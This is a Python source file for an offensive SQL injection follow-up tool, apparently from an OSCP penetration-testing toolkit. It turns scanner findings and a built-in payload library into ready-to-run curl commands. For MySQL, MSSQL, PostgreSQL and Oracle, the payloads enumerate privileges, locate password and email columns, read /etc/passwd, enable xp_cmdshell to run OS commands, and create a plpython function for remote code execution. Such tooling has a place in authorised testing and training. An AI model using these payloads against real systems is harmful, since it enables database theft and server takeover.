#!/usr/bin/env python3
"""
SQL Injection Follow-Up Commands Reference Tool
Educational reference for post-exploitation enumeration techniques
Supports piping from crack sqli-scan for automated command generation

Pipeline Mode:
- Default: Only process HIGH confidence (≥80%) findings
- --all: Process all findings (deduplicates automatically)
"""

import argparse
import sys
import re
from urllib.parse import urlparse, quote

# Import from the modular SQLi scanner
try:
    from .databases import DatabaseEnumeration
    from crack.core.themes import Colors
except ImportError:
    # Fallback for standalone execution
    sys.path.insert(0, '/home/kali/OSCP')
    try:
        from crack.tools.recon.sqli.databases import DatabaseEnumeration
        from crack.core.themes import Colors
    except ImportError:
        # Ultimate fallback - define Colors locally
        class Colors:
            HEADER = '\033[95m'
            BLUE = '\033[94m'
            GREEN = '\033[92m'
            YELLOW = '\033[93m'
            RED = '\033[91m'
            CYAN = '\033[96m'
            BOLD = '\033[1m'
            END = '\033[0m'


class ScannerOutputParser:
    """Parse output from crack sqli-scan"""

    def __init__(self, min_confidence=80):
        self.min_confidence = min_confidence
        self.ansi_escape = re.compile(r'\x1b\[[0-9;]*m')

    def strip_ansi(self, text):
        """Remove ANSI color codes"""
        return self.ansi_escape.sub('', text)

    def parse_stdin(self, stdin_text):
        """Parse scanner output from stdin"""
        lines = [self.strip_ansi(line) for line in stdin_text.split('\n')]

        data = {
            'target': None,
            'method': 'GET',
            'param': None,
            'db_type': None,
            'post_data': None,
            'confidence': 0,
            'curl_commands': [],
            'injection_type': None
        }

        # Extract basic info
        for i, line in enumerate(lines):
            if 'Target:' in line:
                match = re.search(r'Target:\s*(\S+)', line)
                if match:
                    data['target'] = match.group(1)

            if 'Method:' in line:
                match = re.search(r'Method:\s*(\w+)', line)
                if match:
                    data['method'] = match.group(1)

            if 'Parameter:' in line or 'Parameters:' in line:
                match = re.search(r'Parameters?:\s*(\w+)', line)
                if match:
                    data['param'] = match.group(1)

            if 'Database:' in line and 'EXPLOITATION GUIDE' in '\n'.join(lines[max(0,i-5):i+5]):
                match = re.search(r'Database:\s*(\w+)', line)
                if match:
                    data['db_type'] = match.group(1).lower()

            if 'Method:' in line and 'injection' in line.lower():
                match = re.search(r'Method:\s*(\w+)-based injection', line)
                if match:
                    data['injection_type'] = match.group(1).lower()

            # Extract confidence
            if 'Confidence:' in line or '[' in line and '%]' in line:
                match = re.search(r'(\d+)%', line)
                if match:
                    conf = int(match.group(1))
                    if conf > data['confidence']:
                        data['confidence'] = conf

        # Check if confidence meets threshold
        if data['confidence'] < self.min_confidence:
            return None  # Skip low confidence findings

        # Extract curl commands WITH metadata from RECOMMENDED CURL COMMANDS section
        in_curl_section = False
        current_curl_lines = []
        current_metadata = {}
        commands_with_metadata = []

        for i, line in enumerate(lines):
            if 'RECOMMENDED CURL COMMANDS' in line:
                in_curl_section = True
                continue

            if in_curl_section:
                # Stop at next major section
                if line.strip().startswith('[') and ']' in line:
                    if 'RECOMMENDED' not in line and 'CURL' not in line:
                        # Save last command
                        if current_curl_lines:
                            full_cmd = ' '.join(current_curl_lines).strip()
                            if '-d' in full_cmd and not data['post_data']:
                                match = re.search(r'-d\s+"([^"]+)"', full_cmd)
                                if match:
                                    data['post_data'] = match.group(1)
                            commands_with_metadata.append({
                                'curl': full_cmd,
                                **current_metadata
                            })
                        break

                # Extract metadata from decoration lines
                if 'Purpose:' in line:
                    purpose_match = re.search(r'Purpose:\s*(.+)', line)
                    if purpose_match:
                        current_metadata['purpose'] = purpose_match.group(1).strip()

                elif 'What to look for:' in line:
                    what_match = re.search(r'What to look for:\s*(.+)', line)
                    if what_match:
                        current_metadata['what_to_look_for'] = what_match.group(1).strip()

                elif '⚠ CRITICAL:' in line or (line.strip().startswith('⚠') and 'CRITICAL:' in line):
                    crit_match = re.search(r'CRITICAL:\s*(.+)', line)
                    if crit_match:
                        current_metadata['critical_note'] = crit_match.group(1).strip()

                elif '⚠ Replace:' in line or (line.strip().startswith('⚠') and 'Replace:' in line):
                    replace_match = re.search(r'Replace:\s*(.+)', line)
                    if replace_match:
                        current_metadata['replace_note'] = replace_match.group(1).strip()

                elif '⚡ Efficiency:' in line or (line.strip().startswith('⚡') and 'Efficiency:' in line):
                    eff_match = re.search(r'Efficiency:\s*(.+)', line)
                    if eff_match:
                        current_metadata['efficiency_note'] = eff_match.group(1).strip()

                elif '📝 Example:' in line or (line.strip().startswith('📝') and 'Example:' in line):
                    ex_match = re.search(r'Example:\s*(.+)', line)
                    if ex_match:
                        current_metadata['example'] = ex_match.group(1).strip()

                # Skip other decoration lines (but we've already extracted their data above)
                elif any(x in line for x in ['├─', '└─', 'Command:']):
                    continue

                # Start of new curl command
                elif 'curl' in line.lower():
                    # Save previous command if exists
                    if current_curl_lines:
                        full_cmd = ' '.join(current_curl_lines).strip()
                        if '-d' in full_cmd and not data['post_data']:
                            match = re.search(r'-d\s+"([^"]+)"', full_cmd)
                            if match:
                                data['post_data'] = match.group(1)
                        commands_with_metadata.append({
                            'curl': full_cmd,
                            **current_metadata
                        })

                    # Start new command and reset metadata
                    current_curl_lines = [line.strip()]
                    current_metadata = {}

                # Continuation of current curl command (has backslash or starts with -d/pipe)
                elif current_curl_lines and (line.strip().startswith('-d ') or
                                             line.strip().startswith('| ') or
                                             (current_curl_lines and '\\' in current_curl_lines[-1])):
                    current_curl_lines.append(line.strip())

        # Don't forget the last command
        if current_curl_lines:
            full_cmd = ' '.join(current_curl_lines).strip()
            if '-d' in full_cmd and not data['post_data']:
                match = re.search(r'-d\s+"([^"]+)"', full_cmd)
                if match:
                    data['post_data'] = match.group(1)
            commands_with_metadata.append({
                'curl': full_cmd,
                **current_metadata
            })

        data['curl_commands'] = commands_with_metadata

        return data if data['target'] and data['param'] else None

    def deduplicate_commands(self, commands):
        """Remove duplicate commands while preserving order"""
        seen = set()
        unique = []
        for cmd in commands:
            # Normalize command for comparison
            normalized = re.sub(r'\s+', ' ', cmd.strip())
            if normalized not in seen:
                seen.add(normalized)
                unique.append(cmd)
        return unique


class CommandFormatter:
    """Format commands for execution"""

    def __init__(self, strip_colors=False):
        self.strip_colors = strip_colors
        self.ansi_escape = re.compile(r'\x1b\[[0-9;]*m')

    def strip_ansi(self, text):
        """Remove ANSI color codes"""
        if self.strip_colors:
            return self.ansi_escape.sub('', text)
        return text

    def format_for_execution(self, data, output_file=None, original_output=None):
        """Generate executable commands from parsed data and append to original output"""
        if not data:
            # Still show original output even if no high-confidence findings
            if original_output:
                print(original_output)
            print(f"\n{Colors.YELLOW}[!] No high-confidence findings to process{Colors.END}")
            print(f"    Use --all to include all findings regardless of confidence")
            return

        output_lines = []

        # First, include original scanner output if provided
        if original_output:
            output_lines.append(original_output)
            # Add separator
            output_lines.append(f"\n{Colors.BOLD}{Colors.CYAN}")
            output_lines.append("=" * 60 + "\n")
            output_lines.append(f"{Colors.END}")

        # Add follow-up commands section
        header = f"""{Colors.BOLD}{Colors.GREEN}[FOLLOW-UP ENUMERATION COMMANDS]{Colors.END}
{Colors.YELLOW}Generated by C.R.A.C.K. sqli-fu{Colors.END}
Target: {data['target']}
Method: {data['method']}
Parameter: {data['param']}
Database: {data['db_type'] or 'unknown'}
Confidence: {data['confidence']}%
{'-' * 60}

"""
        output_lines.append(header)

        if not data['curl_commands']:
            output_lines.append("# No curl commands found in scanner output\n")
        else:
            # Deduplicate commands
            unique_commands = self._deduplicate_commands(data['curl_commands'])

            output_lines.append(f"{Colors.CYAN}Total Commands: {len(unique_commands)}{Colors.END}\n\n")

            for i, cmd in enumerate(unique_commands, 1):
                # Handle both dict (with metadata) and string (legacy) formats
                if isinstance(cmd, dict):
                    curl_cmd = cmd.get('curl', '')
                    purpose = cmd.get('purpose')
                    what_to_look_for = cmd.get('what_to_look_for')
                    critical_note = cmd.get('critical_note')
                    replace_note = cmd.get('replace_note')
                    efficiency_note = cmd.get('efficiency_note')
                    example = cmd.get('example')

                    # Display command number
                    output_lines.append(f"{Colors.YELLOW}# Command {i}{Colors.END}\n")

                    # Display metadata with decorations (matching scanner output format)
                    if purpose:
                        output_lines.append(f"   {Colors.YELLOW}├─ Purpose:{Colors.END} {purpose}\n")
                    if what_to_look_for:
                        output_lines.append(f"   {Colors.YELLOW}└─ What to look for:{Colors.END} {what_to_look_for}\n")
                    if critical_note:
                        output_lines.append(f"      {Colors.RED}⚠ CRITICAL:{Colors.END} {critical_note}\n")
                    if replace_note:
                        output_lines.append(f"      {Colors.RED}⚠ Replace:{Colors.END} {replace_note}\n")
                    if efficiency_note:
                        output_lines.append(f"      {Colors.BLUE}⚡ Efficiency:{Colors.END} {efficiency_note}\n")
                    if example:
                        output_lines.append(f"      {Colors.GREEN}📝 Example:{Colors.END} {example}\n")

                    # Display the curl command
                    cleaned = self._clean_command(curl_cmd)
                    output_lines.append(f"{Colors.GREEN}{cleaned}{Colors.END}\n\n")
                else:
                    # Legacy string format (no metadata)
                    cleaned = self._clean_command(cmd)
                    output_lines.append(f"{Colors.YELLOW}# Command {i}{Colors.END}\n")
                    output_lines.append(f"{Colors.GREEN}{cleaned}{Colors.END}\n\n")

        # Add usage tip
        output_lines.append(f"\n{Colors.BOLD}[USAGE]{Colors.END}\n")
        output_lines.append(f"  {Colors.CYAN}• Copy/paste commands above to execute enumeration{Colors.END}\n")
        output_lines.append(f"  {Colors.CYAN}• Replace TABLENAME placeholders with actual table names{Colors.END}\n")
        output_lines.append(f"  {Colors.CYAN}• Commands are ready to execute as-is{Colors.END}\n")

        # Combine output
        full_output = ''.join(output_lines)

        # Always print to screen
        print(full_output)

        # Optionally save to file
        if output_file:
            # For file output, format as bash script
            file_lines = []
            file_lines.append("#!/bin/bash\n")
            file_lines.append("# SQLi Follow-Up Enumeration Commands\n")
            file_lines.append(f"# Generated by C.R.A.C.K. sqli-fu\n")
            file_lines.append(f"# Target: {data['target']}\n")
            file_lines.append(f"# Method: {data['method']}\n")
            file_lines.append(f"# Parameter: {data['param']}\n")
            file_lines.append(f"# Database: {data['db_type'] or 'unknown'}\n")
            file_lines.append(f"# Confidence: {data['confidence']}%\n\n")

            if data['curl_commands']:
                unique_commands = self._deduplicate_commands(data['curl_commands'])
                file_lines.append(f"# Total Commands: {len(unique_commands)}\n\n")

                for i, cmd in enumerate(unique_commands, 1):
                    # Handle both dict (with metadata) and string (legacy) formats
                    if isinstance(cmd, dict):
                        curl_cmd = cmd.get('curl', '')
                        purpose = cmd.get('purpose')
                        what_to_look_for = cmd.get('what_to_look_for')
                        critical_note = cmd.get('critical_note')
                        replace_note = cmd.get('replace_note')
                        efficiency_note = cmd.get('efficiency_note')
                        example = cmd.get('example')

                        file_lines.append(f"# Command {i}\n")
                        if purpose:
                            file_lines.append(f"# Purpose: {purpose}\n")
                        if what_to_look_for:
                            file_lines.append(f"# What to look for: {what_to_look_for}\n")
                        if critical_note:
                            file_lines.append(f"# CRITICAL: {critical_note}\n")
                        if replace_note:
                            file_lines.append(f"# Replace: {replace_note}\n")
                        if efficiency_note:
                            file_lines.append(f"# Efficiency: {efficiency_note}\n")
                        if example:
                            file_lines.append(f"# Example: {example}\n")

                        cleaned = self._clean_command(curl_cmd)
                        file_lines.append(f"{self.strip_ansi(cleaned)}\n\n")
                    else:
                        # Legacy string format (no metadata)
                        cleaned = self._clean_command(cmd)
                        file_lines.append(f"# Command {i}\n")
                        file_lines.append(f"{self.strip_ansi(cleaned)}\n\n")

            file_output = ''.join(file_lines)
            with open(output_file, 'w') as f:
                f.write(self.strip_ansi(file_output))
            print(f"{Colors.GREEN}[+] Commands saved to: {output_file}{Colors.END}")

    def _clean_command(self, cmd):
        """Clean and format curl command"""
        # Remove color codes if needed
        cleaned = self.strip_ansi(cmd)

        # Remove line continuation backslashes but preserve backslashes in grep patterns
        # First protect grep patterns
        cleaned = cleaned.replace('\\|', '<!PIPE!>')

        # Remove line continuation backslashes
        cleaned = cleaned.replace('\\ ', ' ').replace('\\', '')

        # Restore grep pattern backslashes
        cleaned = cleaned.replace('<!PIPE!>', '\\|')

        # Normalize whitespace
        cleaned = re.sub(r'\s+', ' ', cleaned).strip()

        # Format for readability if long
        if len(cleaned) > 120:
            # Split before pipe for readability
            parts = cleaned.split(' | ')
            if len(parts) > 1:
                cleaned = parts[0].strip() + ' \\\n  | ' + ' | '.join(parts[1:]).strip()
            # Split before -d if very long
            elif '-d ' in cleaned and len(cleaned) > 150:
                cleaned = cleaned.replace(' -d ', ' \\\n  -d ', 1)

        return cleaned

    def _deduplicate_commands(self, commands):
        """Remove duplicate commands (handles both strings and dicts with metadata)"""
        seen = set()
        unique = []
        for cmd in commands:
            # Handle both old format (strings) and new format (dicts with metadata)
            if isinstance(cmd, dict):
                curl_cmd = cmd.get('curl', '')
                normalized = re.sub(r'\s+', ' ', self.strip_ansi(curl_cmd).strip())
                if normalized not in seen:
                    seen.add(normalized)
                    unique.append(cmd)
            else:
                # Legacy string format
                normalized = re.sub(r'\s+', ' ', self.strip_ansi(cmd).strip())
                if normalized not in seen:
                    seen.add(normalized)
                    unique.append(cmd)
        return unique


class SqliFu:
    def __init__(self, db_type=None, target=None, param=None, category=None):
        self.db_type = db_type.lower() if db_type else 'all'
        self.target = target or 'http://target.com/page.php'
        self.param = param or 'id'
        self.category = category.lower() if category else None

        # Try to use existing DatabaseEnumeration if available
        try:
            from crack.enumeration.sqli.databases import DatabaseEnumeration
            self.db_enum = DatabaseEnumeration
            self.use_integrated = True
        except ImportError:
            self.db_enum = None
            self.use_integrated = False

        # Fallback database-specific payloads
        self.databases = {
            'mysql': self._get_mysql_payloads(),
            'mssql': self._get_mssql_payloads(),
            'postgresql': self._get_postgresql_payloads(),
            'oracle': self._get_oracle_payloads()
        }

    def _get_mysql_payloads(self):
        """MySQL-specific enumeration payloads"""
        return {
            'counting': [
                ("Count All Tables", "' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS int)--"),
                ("Count Current DB Tables", "' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) AS int)--"),
                ("Count Users", "' AND 1=CAST((SELECT COUNT(DISTINCT user) FROM mysql.user) AS int)--"),
                ("Count Rows in Table", "' AND 1=CAST((SELECT COUNT(*) FROM TABLENAME) AS int)--")
            ],
            'privileges': [
                ("Current User Privileges", "' AND 1=CAST((SELECT GROUP_CONCAT(privilege_type) FROM information_schema.user_privileges WHERE grantee=CONCAT(\"'\",current_user(),\"'\")) AS int)--"),
                ("Check FILE Privilege", "' AND IF((SELECT COUNT(*) FROM information_schema.user_privileges WHERE grantee=CONCAT(\"'\",current_user(),\"'\") AND privilege_type='FILE')>0, 1=CAST('has_file' AS int), 1)--"),
                ("Check SUPER Privilege", "' AND IF((SELECT COUNT(*) FROM information_schema.user_privileges WHERE grantee=CONCAT(\"'\",current_user(),\"'\") AND privilege_type='SUPER')>0, 1=CAST('is_super' AS int), 1)--")
            ],
            'sensitive': [
                ("Find User Tables", "' AND 1=CAST((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() AND (table_name LIKE '%user%' OR table_name LIKE '%admin%')) AS int)--"),
                ("Find Password Columns", "' AND 1=CAST((SELECT GROUP_CONCAT(CONCAT(table_name,'.',column_name)) FROM information_schema.columns WHERE table_schema=database() AND column_name LIKE '%pass%') AS int)--"),
                ("Find Email Columns", "' AND 1=CAST((SELECT GROUP_CONCAT(CONCAT(table_name,'.',column_name)) FROM information_schema.columns WHERE table_schema=database() AND column_name LIKE '%email%') AS int)--")
            ],
            'advanced': [
                ("Read /etc/passwd", "' AND 1=CAST((SELECT LOAD_FILE('/etc/passwd')) AS int)--"),
                ("Database Write Directory", "' AND 1=CAST((SELECT @@secure_file_priv) AS int)--"),
                ("Full Version Info", "' AND 1=CAST((SELECT CONCAT(@@version,':',@@version_compile_os,':',@@hostname)) AS int)--")
            ]
        }

    def _get_mssql_payloads(self):
        """MSSQL-specific enumeration payloads"""
        return {
            'counting': [
                ("Count All Tables", "'; SELECT CAST(COUNT(*) AS int) FROM information_schema.tables--"),
                ("Count Databases", "'; SELECT CAST(COUNT(*) AS int) FROM sys.databases--"),
                ("Count Logins", "'; SELECT CAST(COUNT(*) AS int) FROM sys.sql_logins--")
            ],
            'privileges': [
                ("Server Permissions", "'; SELECT CAST(permission_name AS int) FROM fn_my_permissions(NULL, 'SERVER')--"),
                ("Check sysadmin", "'; IF IS_SRVROLEMEMBER('sysadmin')=1 SELECT CAST('is_sysadmin' AS int)--"),
                ("Check xp_cmdshell", "'; SELECT CAST(value_in_use AS int) FROM sys.configurations WHERE name='xp_cmdshell'--")
            ],
            'sensitive': [
                ("Find User Tables", "'; SELECT CAST(STRING_AGG(name,',') AS int) FROM sys.tables WHERE name LIKE '%user%'--"),
                ("Find Password Columns", "'; SELECT CAST(STRING_AGG(t.name+'.'+c.name,',') AS int) FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id WHERE c.name LIKE '%pass%'--")
            ],
            'advanced': [
                ("Enable xp_cmdshell", "'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--"),
                ("Execute OS Command", "'; EXEC xp_cmdshell 'whoami'--")
            ]
        }

    def _get_postgresql_payloads(self):
        """PostgreSQL-specific enumeration payloads"""
        return {
            'counting': [
                ("Count All Tables", "' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables)::int AS int)--"),
                ("Count Databases", "' AND 1=CAST((SELECT COUNT(*) FROM pg_database)::int AS int)--"),
                ("Count Roles", "' AND 1=CAST((SELECT COUNT(*) FROM pg_roles)::int AS int)--")
            ],
            'privileges': [
                ("Check Superuser", "' AND 1=CAST((SELECT usesuper FROM pg_user WHERE usename=current_user)::int AS int)--"),
                ("User Privileges", "' AND 1=CAST((SELECT string_agg(privilege_type,',') FROM information_schema.role_table_grants WHERE grantee=current_user)::int AS int)--"),
                ("File Read Access", "' AND 1=CAST((SELECT has_function_privilege(current_user, 'pg_read_file(text)', 'execute'))::int AS int)--")
            ],
            'sensitive': [
                ("Find User Tables", "' AND 1=CAST((SELECT string_agg(tablename,',') FROM pg_tables WHERE tablename LIKE '%user%')::int AS int)--"),
                ("Find Password Columns", "' AND 1=CAST((SELECT string_agg(table_name||'.'||column_name,',') FROM information_schema.columns WHERE column_name LIKE '%pass%')::int AS int)--")
            ],
            'advanced': [
                ("Read Files", "' AND 1=CAST((SELECT pg_read_file('/etc/passwd'))::int AS int)--"),
                ("List Extensions", "' AND 1=CAST((SELECT string_agg(extname,',') FROM pg_extension)::int AS int)--"),
                ("RCE via plpython", "'; CREATE FUNCTION cmd(text) RETURNS text AS 'import os; return os.popen(args[0]).read()' LANGUAGE plpythonu; SELECT cmd('id')--")
            ]
        }

    def _get_oracle_payloads(self):
        """Oracle-specific enumeration payloads"""
        return {
            'counting': [
                ("Count All Tables", "' AND 1=(SELECT COUNT(*) FROM all_tables)--"),
                ("Count Users", "' AND 1=(SELECT COUNT(*) FROM all_users)--")
            ],
            'privileges': [
                ("System Privileges", "' AND 1=(SELECT LISTAGG(privilege,',') WITHIN GROUP (ORDER BY privilege) FROM user_sys_privs)--"),
                ("Check DBA Role", "' AND 1=(SELECT DECODE(COUNT(*),0,1,1/0) FROM user_role_privs WHERE granted_role='DBA')--")
            ],
            'sensitive': [
                ("Find User Tables", "' AND 1=(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE table_name LIKE '%USER%')--")
            ],
            'advanced': [
                ("Java Version", "' AND 1=(SELECT dbms_java.get_ojvm_property('java.version') FROM dual)--")
            ]
        }

    def generate_curl_command(self, payload):
        """Generate curl command for the payload"""
        encoded = quote(payload)
        return f"curl \"{self.target}?{self.param}={encoded}\""

    def display_category(self, db_name, category_name, payloads):
        """Display payloads for a specific category"""
        category_display = {
            'counting': 'Counting Operations',
            'privileges': 'Privilege Enumeration',
            'sensitive': 'Sensitive Data Discovery',
            'advanced': 'Advanced Enumeration'
        }

        print(f"\n{Colors.YELLOW}[{category_display.get(category_name, category_name.upper())}]{Colors.END}")
        print("-" * 60)

        for title, payload in payloads:
            print(f"\n  {Colors.CYAN}• {title}{Colors.END}")
            print(f"    {Colors.BOLD}Payload:{Colors.END} {payload}")

            # Show curl command
            curl_cmd = self.generate_curl_command(payload)
            print(f"    {Colors.BOLD}Command:{Colors.END}")
            print(f"    {curl_cmd}")

            # Add helpful notes
            if "TABLENAME" in payload:
                print(f"    {Colors.YELLOW}Note: Replace TABLENAME with actual table name{Colors.END}")
            if "OFFSET" in payload:
                print(f"    {Colors.YELLOW}Note: Increment OFFSET to enumerate all results{Colors.END}")

    def display_integrated_commands(self):
        """Display commands using the integrated DatabaseEnumeration module"""
        databases = ['mysql', 'mssql', 'postgresql', 'oracle'] if self.db_type == 'all' else [self.db_type]

        for db in databases:
            if self.db_type == 'all':
                print(f"\n{Colors.BOLD}{Colors.BLUE}═══ {db.upper()} DATABASE ═══{Colors.END}")

            # Get follow-up commands from the integrated module
            commands = self.db_enum.get_followup_commands(
                db, self.param, 'GET', self.target, None
            )

            # Filter by category if specified
            if self.category:
                category_map = {
                    'counting': 'Counting Operations',
                    'privileges': 'Privilege Enumeration',
                    'sensitive': 'Sensitive Data Discovery',
                    'advanced': 'Advanced Enumeration'
                }
                category_name = category_map.get(self.category)
                if category_name in commands:
                    commands = {category_name: commands[category_name]}
                else:
                    print(f"\n{Colors.RED}Category '{self.category}' not found for {db}{Colors.END}")
                    continue

            # Display commands
            for category, cmd_list in commands.items():
                print(f"\n{Colors.YELLOW}[{category}]{Colors.END}")
                print("-" * 60)

                for cmd in cmd_list:
                    print(f"\n  {Colors.CYAN}• {cmd['title']}{Colors.END}")
                    print(f"    {Colors.BLUE}Purpose:{Colors.END} {cmd['description']}")
                    print(f"    {Colors.BOLD}Command:{Colors.END}")
                    print(f"    {Colors.GREEN}{cmd['curl']}{Colors.END}")
                    print(f"    {Colors.YELLOW}Look for:{Colors.END} {cmd['look_for']}")

                    if cmd.get('requires_input'):
                        print(f"    {Colors.RED}⚠ Replace:{Colors.END} {cmd['requires_input']} with actual value")

    def generate_report(self):
        """Display the SQLi enumeration reference"""
        print(f"\n{Colors.BOLD}{Colors.GREEN}[SQL INJECTION FOLLOW-UP ENUMERATION]{Colors.END}")
        print("=" * 60)
        print(f"Target: {self.target}")
        print(f"Parameter: {self.param}")
        print(f"Database Type: {self.db_type.upper() if self.db_type != 'all' else 'ALL'}")

        # Use integrated module if available
        if self.use_integrated:
            self.display_integrated_commands()
        else:
            # Use fallback payloads
            databases_to_show = self.databases.keys() if self.db_type == 'all' else [self.db_type]

            if self.db_type not in self.databases and self.db_type != 'all':
                print(f"\n{Colors.RED}Unknown database type: {self.db_type}{Colors.END}")
                print("Supported: mysql, mssql, postgresql, oracle")
                return

            for db in databases_to_show:
                if self.db_type == 'all':
                    print(f"\n{Colors.BOLD}{Colors.BLUE}═══ {db.upper()} DATABASE ═══{Colors.END}")

                db_payloads = self.databases[db]

                if self.category:
                    if self.category in db_payloads:
                        self.display_category(db, self.category, db_payloads[self.category])
                    else:
                        print(f"\n{Colors.RED}Unknown category: {self.category}{Colors.END}")
                        print("Available: counting, privileges, sensitive, advanced")
                else:
                    for cat_name, cat_payloads in db_payloads.items():
                        self.display_category(db, cat_name, cat_payloads)

        # Summary tips
        print(f"\n{Colors.BOLD}[EXPLOITATION TIPS]{Colors.END}")
        print("-" * 60)
        print("  • Error-based: Look for database errors in response")
        print("  • Blind: Use boolean conditions and time delays")
        print("  • Union-based: Match column count first")
        print("  • Always URL-encode special characters in GET requests")
        print("  • Use -X POST for POST parameter injection")

        print(f"\n{Colors.BOLD}[MANUAL TESTING WORKFLOW]{Colors.END}")
        print("-" * 60)
        print("  1. Identify database type via error messages")
        print("  2. Extract current user and database name")
        print("  3. Check privilege level (FILE, SUPER, DBA, etc.)")
        print("  4. Enumerate tables and columns")
        print("  5. Extract sensitive data")
        print("  6. Attempt advanced techniques if privileges allow")


def main():
    parser = argparse.ArgumentParser(
        description='SQLi-Fu - SQL Injection Follow-Up Enumeration Reference',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Pipeline Mode (from sqli-scan):
  crack sqli-scan http://target/page.php?id=1 | crack sqli-fu
  crack sqli-scan ... -v --quick -n 1 | crack sqli-fu -o commands.sh
  crack sqli-scan ... | crack sqli-fu --all              # Include all findings

Manual Reference Mode:
  crack sqli-fu                                     # Show all databases
  crack sqli-fu mysql                               # MySQL payloads only
  crack sqli-fu mssql -c privileges                 # MSSQL privilege checks
  crack sqli-fu postgresql -t http://10.10.10.1/page.php -p user_id
  crack sqli-fu oracle -c advanced                  # Oracle RCE payloads

Pipeline Filtering:
  Default: Only HIGH confidence findings (≥80%)
  --all:   Process all findings (deduplicates automatically)

Database Types:
  mysql, mssql, postgresql, oracle, all

Categories:
  counting     - Count tables, users, rows
  privileges   - Check user permissions
  sensitive    - Find credential columns
  advanced     - File read, RCE attempts
        """
    )

    parser.add_argument('database', nargs='?', default='all',
                       choices=['mysql', 'mssql', 'postgresql', 'oracle', 'all'],
                       help='Database type (default: all)')
    parser.add_argument('-t', '--target',
                       help='Target URL (default: http://target.com/page.php)')
    parser.add_argument('-p', '--param',
                       help='Vulnerable parameter name (default: id)')
    parser.add_argument('-c', '--category',
                       choices=['counting', 'privileges', 'sensitive', 'advanced'],
                       help='Show specific category only')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Show detailed explanations')

    # Pipeline mode arguments
    parser.add_argument('-o', '--output',
                       help='Save commands to file (always prints to screen)')
    parser.add_argument('--all', action='store_true', dest='include_all',
                       help='Process all findings (default: only high confidence ≥80%%)')
    parser.add_argument('--strip-colors', action='store_true',
                       help='Remove ANSI colors from output')

    args = parser.parse_args()

    try:
        # Check for piped input (pipeline mode)
        if not sys.stdin.isatty():
            # Pipeline mode - parse scanner output
            stdin_text = sys.stdin.read()

            # Set confidence threshold
            min_confidence = 0 if args.include_all else 80

            # Parse scanner output
            scanner_parser = ScannerOutputParser(min_confidence=min_confidence)
            data = scanner_parser.parse_stdin(stdin_text)

            # Format and output commands (includes original output)
            formatter = CommandFormatter(strip_colors=args.strip_colors)
            formatter.format_for_execution(data, args.output, original_output=stdin_text)

        else:
            # Manual reference mode - existing functionality
            tool = SqliFu(
                db_type=args.database,
                target=args.target,
                param=args.param,
                category=args.category
            )
            tool.generate_report()

    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Reference lookup interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}Error: {e}{Colors.END}")
        sys.exit(1)


if __name__ == '__main__':
    main()